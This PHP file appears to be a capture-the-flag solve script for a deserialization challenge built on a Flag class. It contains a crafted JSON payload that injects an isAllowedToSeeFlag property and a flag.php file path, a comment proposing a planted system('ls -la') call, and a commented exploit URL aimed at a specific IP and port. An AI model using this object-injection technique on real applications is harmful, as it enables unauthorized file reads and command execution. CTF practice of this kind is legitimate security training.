<?php
ini_set('allow_url_fopen', false);

interface SecurSerializable
{
    public function __construct();
    public function __shutdown();
    public function __startup();
    public function __toString();
}

class Flag implements SecurSerializable
{
    public $flag;
    public $flagfile;
    public $properties = array();

    public function __construct($flagfile = null)
    {
        if (isset($flagfile)) {
            $this->flagfile = $flagfile;
        }
    }
    public function __shutdown()
    {
        return $this->properties;
    }
    public function __startup()
    {
        $this->readFlag();
    }
    public function __toString()
    {
        return "ClassFlag(" . $this->flag . ")";
    }
    public function setFlag($flag)
    {
        $this->flag = $flag;
    }
    public function getFlag()
    {
        return $this->flag;
    }
    public function setFlagFile($flagfile)
    {
        if (stristr($flagfile, "flag") || !file_exists($flagfile)) {
            echo "ERROR:Fileisnotvalid!";
            return;
        }
        $this->flagfile = $flagfile;
    }
    public function getFlagFile()
    {
        return $this->flagfile;
    }
    public function readFlag()
    {
        if (!isset($this->flag) && file_exists($this->flagfile)) {
            $this->flag = join("", file($this->flagfile));
        }
    }
    public function showFlag()
    {
        echo $this->isAllowedToSeeFlag;
        if ($this->isAllowedToSeeFlag) {
            echo "Theflagis:" . $this->flag;
        } else {
            echo "Theflagis:[You'renotallowedtoseeit!]";
        }
    }
}
function secure_jsonify($obj)
{
    $data = array();
    $data['class'] = get_class($obj);
    $data['properties'] = array();
    foreach ($obj->__shutdown() as &$key) {
        $data['properties'][$key] = serialize($obj->$key);
    }
    return json_encode($data);
}
function secure_unjsonify($json, $allowed_classes)
{
    $data = json_decode($json, true);
    if (!in_array($data['class'], $allowed_classes)) {
        throw new Exception("ErrorProcessingRequest", 1);
    }
    $obj = new $data['class']();
    foreach ($data['properties'] as $key => $value) {
        $obj->$key = unserialize($value, ['allowed_classes' => false]);
    }
    $obj->__startup();
    return $obj;
}

# make $this->isAllowedToSeeFlag to true, use unserialize vulnerability to get the flag, set flag value to <?php system("ls -la");



$a = '{"class":"Flag","properties":{"isAllowedToSeeFlag":"b:1;","flagfile":"s:8:\"flag.php\";"}}';
echo $a."\n";
$f = secure_unjsonify($a, array('Flag'));
$f->setFlagFile('index.php');
$f->readFlag();
$f->showFlag();
// http://52.59.124.14:10002/?show=&obj={%22class%22:%22Flag%22,%22properties%22:{%22isAllowedToSeeFlag%22:%22b:1;%22,%22flagfile%22:%22s:8:\%22flag.php\%22;%22}}&flagfile=index.php
?>
